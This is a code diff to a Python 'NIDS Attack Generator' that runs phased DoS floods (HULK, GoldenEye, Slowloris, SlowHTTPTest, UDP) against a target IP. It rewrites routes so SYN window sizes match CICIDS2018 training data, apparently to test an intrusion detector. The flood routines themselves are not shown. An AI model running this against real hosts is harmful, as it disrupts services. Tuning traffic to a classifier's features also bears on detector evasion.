@@ -95,32 +95,29 @@ def check_and_enable_tcp_timestamps():
 # ─── TCP Window Fix (Linux) ──────────────────────────────
 _ROUTE_MODIFIED = False
 _ORIGINAL_ROUTE_DEV = None
+_ROUTE_CMD_BASE = None  # Cached route command base for quick window changes
 
-def setup_tcp_window(target_ip):
-    """On Linux, set `ip route ... window 225` so SYN packets advertise
-    Init Fwd Win Byts = 225.
 
-    WHY THIS IS CRITICAL:
-    The CICIDS2018 HULK training data has Init Fwd Win Byts = 225, and
-    the model learned this as a very strong DoS indicator (89.5% DoS
-    when 225 vs 62% Benign when anything else).
+def setup_tcp_window(target_ip, window=225):
+    """On Linux, set `ip route ... window <window>` so SYN packets advertise
+    the specified Init Fwd Win Byts value.
 
-    Problem: Linux kernel doubles SO_RCVBUF and enforces a minimum of
-    ~2304 bytes (SOCK_MIN_RCVBUF), so setsockopt(SO_RCVBUF, 225) gives
-    an actual buffer of ~2304 → SYN window ~2304 → model says Benign.
+    CICIDS2018 training data window values per technique:
+      HULK:         225   (75% of flows)
+      GoldenEye:    26883
+      Slowloris:    26883
+      SlowHTTPTest: 26883
 
-    Fix: `ip route add <target>/32 dev <iface> window 225` tells the
-    kernel to advertise TCP window ≤ 225 in SYN packets, bypassing the
-    SO_RCVBUF minimum. This only affects connections to the target IP.
+    The ip route window parameter caps the TCP SYN window advertisement,
+    bypassing the Linux SO_RCVBUF minimum (~2304 bytes).
     """
-    global _ROUTE_MODIFIED, _ORIGINAL_ROUTE_DEV
+    global _ROUTE_MODIFIED, _ORIGINAL_ROUTE_DEV, _ROUTE_CMD_BASE
 
     if platform.system() != "Linux":
         return True  # Not needed on Windows (SO_RCVBUF works as expected)
 
     print(f"\n[*] ── TCP Window Configuration (Linux) ──────────")
-    print(f"[*] Setting Init Fwd Win Byts = 225 for connections to {target_ip}")
-    print(f"[*] This is CRITICAL: model expects 225 for DoS detection")
+    print(f"[*] Setting Init Fwd Win Byts = {window} for connections to {target_ip}")
 
     try:
         # 1. Get current route to determine the network interface
@@ -148,13 +145,14 @@ def setup_tcp_window(target_ip):
         via_match = re.search(r'\bvia\s+(\S+)', route_output)
         gateway = via_match.group(1) if via_match else None
 
-        # 2. Add a /32 host route with window=225
-        # This overrides the existing route (more specific) for just this IP
-        cmd = ["ip", "route", "replace", f"{target_ip}/32"]
+        # 2. Build and cache the route command base (reused by change_tcp_window)
+        _ROUTE_CMD_BASE = ["ip", "route", "replace", f"{target_ip}/32"]
         if gateway:
-            cmd += ["via", gateway]
-        cmd += ["dev", iface, "window", "225"]
+            _ROUTE_CMD_BASE += ["via", gateway]
+        _ROUTE_CMD_BASE += ["dev", iface]
 
+        # 3. Set the route with the specified window
+        cmd = _ROUTE_CMD_BASE + ["window", str(window)]
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
         if result.returncode != 0:
             print(f"[!!] Failed to set route: {result.stderr.strip()}")
@@ -164,18 +162,6 @@ def setup_tcp_window(target_ip):
 
         _ROUTE_MODIFIED = True
         print(f"[OK] Route set: {' '.join(cmd)}")
-
-        # 3. Verify by testing actual SO_RCVBUF and comparing
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 225)
-        actual = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
-        s.close()
-        print(f"[*] SO_RCVBUF test: requested=225, kernel_buffer={actual}")
-        if actual != 225:
-            print(f"[*] Kernel doubled/clamped SO_RCVBUF to {actual}")
-            print(f"[*] But ip route window=225 will override the SYN window")
-
-        print(f"[OK] TCP window configured for DoS classification")
         print(f"[*] ─────────────────────────────────────────────\n")
         return True
 
@@ -185,9 +171,35 @@ def setup_tcp_window(target_ip):
         return False
 
 
+def change_tcp_window(target_ip, window):
+    """Quick TCP window change using cached route info from setup_tcp_window.
+    Falls back to full setup if cache is not available."""
+    global _ROUTE_CMD_BASE, _ROUTE_MODIFIED
+
+    if platform.system() != "Linux":
+        return True
+
+    if _ROUTE_CMD_BASE is None:
+        return setup_tcp_window(target_ip, window)
+
+    try:
+        cmd = _ROUTE_CMD_BASE + ["window", str(window)]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
+        if result.returncode != 0:
+            print(f"[!!] Failed to change window: {result.stderr.strip()}")
+            return False
+
+        _ROUTE_MODIFIED = True
+        print(f"[OK] TCP window changed to {window}")
+        return True
+    except Exception as e:
+        print(f"[!!] Error changing TCP window: {e}")
+        return False
+
+
 def restore_tcp_window(target_ip):
     """Remove the /32 host route added by setup_tcp_window."""
-    global _ROUTE_MODIFIED
+    global _ROUTE_MODIFIED, _ROUTE_CMD_BASE
 
     if not _ROUTE_MODIFIED:
         return
@@ -201,6 +213,7 @@ def restore_tcp_window(target_ip):
             capture_output=True, text=True, timeout=5
         )
         _ROUTE_MODIFIED = False
+        _ROUTE_CMD_BASE = None
         print(f"[OK] Restored original route (removed /32 override for {target_ip})")
     except Exception as e:
         print(f"[!] Could not restore route: {e}")
@@ -317,9 +330,9 @@ def parse_args():
 
 
 def main():
-    print("=" * 55)
-    print("  NIDS Attack Generator — DoS Only")
-    print("=" * 55)
+    print("=" * 60)
+    print("  NIDS Attack Generator — DoS (All Subtypes)")
+    print("=" * 60)
     print()
 
     args = parse_args()
@@ -336,18 +349,76 @@ def main():
         print("[-] Aborting — fix connectivity first.")
         sys.exit(1)
 
-    # 4. TCP window fix (Linux only — sets ip route window=225)
-    setup_tcp_window(target_ip)
+    total_duration = args.duration
+    threads = args.threads
 
-    # 5. Launch DoS
-    print(f"[*] Starting DoS attack on {target_ip}:{target_port}")
-    print(f"[*] Duration: {args.duration}s | Threads: {args.threads}")
-    print(f"[*] Techniques: Hulk(4T) + GoldenEye(3T) + Slowloris + SlowHTTPTest + UDP")
+    # ── Time allocation across phases ──
+    # CICIDS2018 ran each tool separately with similar durations:
+    #   HULK: 34 min (116K flows)  — needs Init Fwd Win Byts = 225
+    #   GoldenEye: 43 min (41K)    — needs Init Fwd Win Byts = 26883
+    #   Slowloris: 41 min          — needs Init Fwd Win Byts = 26883
+    #   SlowHTTPTest: 56 min (91K) — needs Init Fwd Win Byts = 26883
+    #
+    # We use 2 phases because `ip route window` is per-destination:
+    #   Phase 1: HULK only          (window=225)   — 50% of time
+    #   Phase 2: GoldenEye+Slow*+UDP (window=26883) — 50% of time
+    hulk_duration = int(total_duration * 0.50)
+    others_duration = total_duration - hulk_duration
+
+    print(f"\n[*] ── Attack Plan ──────────────────────────────────")
+    print(f"[*] Target: {target_ip}:{target_port}")
+    print(f"[*] Total duration: {total_duration}s | Threads: {threads}")
+    print(f"[*]")
+    print(f"[*] Phase 1: HULK             ({hulk_duration}s, window=225)")
+    print(f"[*]   TCP connect+RST close flood, 0 payload")
+    print(f"[*] Phase 2: Mixed            ({others_duration}s, window=26883)")
+    print(f"[*]   GoldenEye + SlowHTTPTest + Slowloris + UDP")
+    print(f"[*] ────────────────────────────────────────────────")
     print(f"[*] Press Ctrl+C to stop\n")
 
+    total_conns = 0
+    total_errs = 0
+
     try:
-        run_dos(target_ip, target_port=target_port,
-                duration=args.duration, threads=args.threads)
+        # ── Phase 1: HULK with window=225 ────────────────────
+        print(f"\n{'='*55}")
+        print(f"  PHASE 1 / 2 : HULK (window=225) — {hulk_duration}s")
+        print(f"{'='*55}")
+        setup_tcp_window(target_ip, window=225)
+        conns, errs = run_dos(
+            target_ip, target_port=target_port,
+            duration=hulk_duration, threads=threads,
+            techniques=['hulk'] * threads
+        )
+        total_conns += conns
+        total_errs += errs
+
+        # ── Phase 2: Mixed with window=26883 ─────────────────
+        print(f"\n{'='*55}")
+        print(f"  PHASE 2 / 2 : GoldenEye+SlowHTTPTest+Slowloris+UDP")
+        print(f"  (window=26883) — {others_duration}s")
+        print(f"{'='*55}")
+        change_tcp_window(target_ip, window=26883)
+
+        # Thread allocation for Phase 2:
+        #   GoldenEye:    4T  (HTTP keep-alive flood, strong detection signal)
+        #   SlowHTTPTest: 3T  (rapid micro-connections)
+        #   Slowloris:    2T  (partial-header connection holding)
+        #   UDP:          1T  (protocol diversity)
+        phase2_techniques = (
+            ['goldeneye'] * 4 +
+            ['slowhttp'] * 3 +
+            ['slowloris'] * 2 +
+            ['udp'] * 1
+        )
+        conns, errs = run_dos(
+            target_ip, target_port=target_port,
+            duration=others_duration, threads=threads,
+            techniques=phase2_techniques
+        )
+        total_conns += conns
+        total_errs += errs
+
     except KeyboardInterrupt:
         print("\n[*] Attack interrupted by user")
     except Exception as e:
@@ -358,7 +429,10 @@ def main():
         # Always restore the route
         restore_tcp_window(target_ip)
 
-    print("\n[+] DoS attack completed!")
+    print(f"\n{'='*55}")
+    print(f"  DoS ATTACK COMPLETE")
+    print(f"  Total: {total_conns} connections, {total_errs} errors")
+    print(f"{'='*55}")
 
 
 if __name__ == "__main__":
